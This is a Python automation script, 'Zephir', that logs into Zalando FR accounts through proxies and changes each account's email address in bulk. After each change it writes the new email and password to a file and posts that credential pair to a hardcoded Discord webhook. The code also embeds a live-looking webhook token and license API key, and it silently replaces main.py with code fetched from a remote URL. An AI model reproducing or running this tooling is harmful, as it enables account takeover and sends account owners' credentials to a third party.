from colorama import Fore
import sys
from colorama import init, AnsiToWin32
import os
import csv
import time
import random
from playwright.sync_api import sync_playwright
import datetime
from discord_webhook import DiscordWebhook
import re
import uuid
import requests
import AutoUpdate


AutoUpdate.set_url("https://raw.githubusercontent.com/Gdonlpb/Zephir/main/version.txt")
AutoUpdate.set_current_version("0.0.0.4")
AutoUpdate.set_download_link("https://raw.githubusercontent.com/Gdonlpb/Zephir/main/main.py")
if AutoUpdate.is_up_to_date() == False:
    AutoUpdate.download("main.py")
    print("Updating")

os.system("echo '\033]0;Zephir\007'")

class colors:
    TIME = '\033[90m'
    WEBSITE = '\033[96m'
    TASK = '\033[91m'
    DEFAULT = '\033[97m'
    V = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    CYAN = '\033[96m'

def mail1(mail1,pwd,mail2,):
    with sync_playwright() as p:
        with open('data/proxies.csv', newline='') as csvfile:
            reader = csv.reader(csvfile, delimiter=':', quotechar='|')
            next(reader)
            for i in range(random.randrange(0,100)):
                next(reader)
            for row in reader:
                user = row[2]  # setting values of proxies
                passw = row[3]  # //
                ip = row[0]  # //
                port = row[1]  # //
                break

        browser = p.firefox.launch(proxy={
      "server": ip+":"+port,
      "username": user,
      "password": passw
    },headless=True)
        current_time = datetime.datetime.now()  # get the time for the terminal output
        stra = str(current_time)  # //
        stra.strip
        current_time = datetime.datetime.now()
        stra = str(current_time)
        stra.strip
        print(
            colors.DEFAULT + "[" + stra + "]" + colors.DEFAULT + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Task Initialized!" + colors.DEFAULT + "")
        page = browser.new_page()
        current_time = datetime.datetime.now()  # get the time for the terminal output
        stra = str(current_time)  # //
        stra.strip
        print(
            colors.DEFAULT + "[" + stra + "]" + colors.TIME + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Connecting" + colors.DEFAULT + "")
        page.goto("https://www.zalando.fr/", timeout=60000)
        current_time = datetime.datetime.now()  # get the time for the terminal output
        stra = str(current_time)  # //
        stra.strip
        print(
            colors.DEFAULT + "[" + stra + "]" + colors.TIME + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Connected" + colors.DEFAULT + "")
        with page.expect_navigation():
            page.click("svg[role=\"img\"]:has-text(\"Se connecter\")")
        current_time = datetime.datetime.now()  # get the time for the terminal output
        stra = str(current_time)  # //
        stra.strip
        print(
            colors.DEFAULT + "[" + stra + "]" + colors.TIME + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Logging in" + colors.DEFAULT + "")
        page.click("[data-testid=\"email_input\"]")
        page.fill("[data-testid=\"email_input\"]", mail1)
        page.click("[data-testid=\"secret_input\"]")
        page.fill("[data-testid=\"secret_input\"]", pwd)
        page.press("[data-testid=\"secret_input\"]", "Enter")
        time.sleep(3)
        #page.screenshot(path="data/status.png")
        page.reload()
        if page.url != "https://www.zalando.fr/myaccount/":
            current_time = datetime.datetime.now()  # get the time for the terminal output
            stra = str(current_time)  # //
            stra.strip
            print(
                colors.DEFAULT + "[" + stra + "]" + colors.FAIL + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Error 002" + colors.DEFAULT + "")
            print(
                colors.DEFAULT + "[" + stra + "]" + colors.WARNING + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Sleeping for 10 seconds..." + colors.DEFAULT + "")
            time.sleep(10)
            browser.close()
        else:
            current_time = datetime.datetime.now()  # get the time for the terminal output
            stra = str(current_time)  # //
            stra.strip
            print(
                colors.DEFAULT + "[" + stra + "]" + colors.TIME + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Waiting..." + colors.DEFAULT + "")
            page.wait_for_url("https://www.zalando.fr/myaccount/")
            time.sleep(0.5)
            page.locator("[aria-label=\"Données\\ personnelles\"] >> text=Données personnelles").click()
            current_time = datetime.datetime.now()  # get the time for the terminal output
            stra = str(current_time)  # //
            stra.strip
            print(
                colors.DEFAULT + "[" + stra + "]" + colors.TIME + " [Zalando FR]" + " [" + "" + mail1 + "]" + " Changing mail" + colors.DEFAULT + "")
            page.locator("xpath=/html/body/div[4]/div/div/div/div[2]/x-wrapper-main/div/div/div[4]/div[2]/button").click()
            #page.locator("text=emailVotre adresse e-mail"+mail1+"Modifier >> [aria-label=\"Modifier\"]").click()
            page.locator("input[name=\"newEmail\"]").click()
            page.locator("input[name=\"newEmail\"]").fill(mail2)
            page.locator("input[name=\"confirmEmail\"]").click()
            page.locator("input[name=\"confirmEmail\"]").fill(mail2)
            if (page.locator("xpath=//*[@id=\"uc-btn-accept-banner\"]").count() > 0):
                page.locator("xpath=//*[@id=\"uc-btn-accept-banner\"]").click()
                time.sleep(0.5)
            page.locator("[placeholder=\"Mot\\ de\\ passe\"]").click()
            page.locator("[placeholder=\"Mot\\ de\\ passe\"]").fill(pwd)
            page.locator("[data-testid=\"save-button\"]").click()
            current_time = datetime.datetime.now()  # get the time for the terminal output
            stra = str(current_time)  # //
            stra.strip
            print(
                    colors.DEFAULT + "[" + stra + "]" + colors.TIME + " [Zalando FR]" + " [" + "" + mail2 + "]" + " Saving..." + colors.DEFAULT + "")
            time.sleep(1.5)
            page.reload()
            time.sleep(0.2)
            if page.url == "https://www.zalando.fr/myaccount/details/":
                print(colors.DEFAULT + "[" + stra + "]" + colors.FAIL + " [Zalando FR]" + " [" + "" + mail2 + "]" + " Error 001" + colors.DEFAULT + "")
                browser.close()
            else :
                current_time = datetime.datetime.now()  # get the time for the terminal output
                stra = str(current_time)  # //
                stra.strip
                print(colors.DEFAULT + "[" + stra + "]" + colors.V + " [Zalando FR]" + " [" + "" + mail2 + "]" + " Task Finished! " + colors.DEFAULT + "")
                time.sleep(2)
                browser.close()
                with open('data/accs.txt', 'a') as f:
                    f.write("\n"+mail2+":"+pwd)
                from discord_webhook import DiscordWebhook

                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/952960096231653437/M6T8kDS1exmVJurq_Jd-ywsWlSmmpp2oMZ1HKN8ISbdnpf9lQJ7QzUK7qGiYyMrekEN6', content=mail2+":"+pwd)
                response = webhook.execute()

import requests

with open('data/key.csv') as csvfile:
    csvreader = csv.reader(csvfile, delimiter=',')
    next(csvreader)
    for row in csvreader:
        license_key = row[0]


    API_KEY = 'pk_Hq6raCcZA64Axv4OuHTcgJtGzwSJFu4g'


    def log(content):
        print("")


    def get_license(license_key):
        headers = {
            'Authorization': f'Bearer {API_KEY}'
        }

        req = requests.get(f'https://api.hyper.co/v5/licenses/{license_key}', headers=headers)
        if req.status_code == 200:
            return req.json()

        return None


    def update_license(license_key, hardware_id):
        headers = {
            'Authorization': f'Bearer {API_KEY}',
            'Content-Type': 'application/json'
        }

        payload = {
            'metadata': {
                'hwid': hardware_id
            }
        }

        req = requests.patch(
            f'https://api.metalabs.io/v4/licenses/{license_key}',
            headers=headers,
            json=payload
        )

        if req.status_code == 200:
            return True

        return None


    def check_license(license_key):
        log('Checking license...')
        license_data = get_license(license_key.strip())
        if license_data:
            hardware_id = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            if license_data.get('metadata', {}) == {}:
                updated = update_license(license_key, hardware_id)
                if updated:
                    return True

                else:
                    log('Something went wrong, please retry.')
            else:
                current_hwid = license_data.get('metadata', {}).get('hwid', '')
                if current_hwid == hardware_id:
                    return True
                else:
                    log('License is already in use on another machine!')
                    input("")
        else:
            log('License not found.')
            input("")
        return None


    # @author : gdonlpb
if check_license(license_key) == True:

    while True:
        os.system('cls')
        init(wrap=False)
        stream = AnsiToWin32(sys.stderr).stream
        print(Fore.LIGHTBLUE_EX + '', file=stream)
        print("                                      ____________ _____  _    _ _____ _____  ")
        print("                                     |___  /  ____|  __ \| |  | |_   _|  __ \ ")
        print("                                        / /| |__  | |__) | |__| | | | | |__) |")
        print("                                       / / |  __| |  ___/|  __  | | | |  _  / ")
        print("                                      / /__| |____| |    | |  | |_| |_| | \ \ ")
        print("                                     /_____|______|_|    |_|  |_|_____|_|  \_|")
        print(Fore.LIGHTBLACK_EX + '', file=stream)
        print("                                                       0.0.3")
        print(Fore.RESET + '                                                -------------------', file=stream)
        print("")
        print(Fore.LIGHTBLACK_EX +"                     ["+Fore.LIGHTWHITE_EX +"1"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX + " MAIL                      "+Fore.LIGHTBLACK_EX +"["+Fore.LIGHTWHITE_EX +"2"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX + " MAIL X2                   "+Fore.LIGHTBLACK_EX +"["+Fore.LIGHTWHITE_EX +"3"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX +" MAIL + PASS", file=stream)
        print("")
        print(Fore.LIGHTBLACK_EX +"                     ["+Fore.LIGHTWHITE_EX +"4"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX + " MAIL X2 + PASS            "+Fore.LIGHTBLACK_EX +"["+Fore.LIGHTWHITE_EX +"5"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX + " MAIL X2 + PASS + ADRESS   "+Fore.LIGHTBLACK_EX +"["+Fore.LIGHTWHITE_EX +"6"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX +" MAIL X2 + ADRESS", file=stream)
        print("")
        print(Fore.LIGHTBLACK_EX +"                     ["+Fore.LIGHTWHITE_EX +"7"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX + " ADRESS                    "+Fore.LIGHTBLACK_EX +"["+Fore.LIGHTWHITE_EX +"8"+Fore.LIGHTBLACK_EX +"]"+ Fore.LIGHTCYAN_EX + " ADRESS + PASS             ", file=stream)
        print("")
        print("")

        mode:str = input(Fore.LIGHTYELLOW_EX+"            >")
        os.system('cls')

        if mode=="1":
            break

        if mode=="2":
            break

        if mode=="3":
            break

        if mode=="4":
            break

        if mode == "5":
            break

        if mode == "6":
            break

        if mode == "7":
            break

        if mode == "8":
            break

    if mode == "1":
        os.system('cls')
        init(wrap=False)
        stream = AnsiToWin32(sys.stderr).stream
        print(Fore.LIGHTBLUE_EX + '', file=stream)
        print("                                      ____________ _____  _    _ _____ _____  ")
        print("                                     |___  /  ____|  __ \| |  | |_   _|  __ \ ")
        print("                                        / /| |__  | |__) | |__| | | | | |__) |")
        print("                                       / / |  __| |  ___/|  __  | | | |  _  / ")
        print("                                      / /__| |____| |    | |  | |_| |_| | \ \ ")
        print("                                     /_____|______|_|    |_|  |_|_____|_|  \_|")
        print(Fore.LIGHTBLACK_EX + '', file=stream)
        print("                                                       0.0.3")
        print(Fore.RESET + '                                                -------------------', file=stream)
        print("")
        print(
            Fore.LIGHTBLACK_EX + "                     [" + Fore.LIGHTWHITE_EX + "1" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTRED_EX + " MAIL                      " + Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTWHITE_EX + "2" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " MAIL X2                   " + Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTWHITE_EX + "3" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " MAIL + PASS",
            file=stream)
        print("")
        print(
            Fore.LIGHTBLACK_EX + "                     [" + Fore.LIGHTWHITE_EX + "4" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " MAIL X2 + PASS            " + Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTWHITE_EX + "5" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " MAIL X2 + PASS + ADRESS   " + Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTWHITE_EX + "6" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " MAIL X2 + ADRESS",
            file=stream)
        print("")
        print(
            Fore.LIGHTBLACK_EX + "                     [" + Fore.LIGHTWHITE_EX + "7" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " ADRESS                    " + Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTWHITE_EX + "8" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTCYAN_EX + " ADRESS + PASS             ",
            file=stream)
        print("")
        print("")

        with open("data/task.csv") as csvfile:
            csvreader = csv.reader(csvfile, delimiter=':')
            next(csvreader)
            for row in csvreader:
                first_mail = row[0]
                pwd = row[1]
                last_mail = row[2]
                mail1(first_mail,pwd,last_mail)
        time.sleep(1)

        os.system('cls')


input("")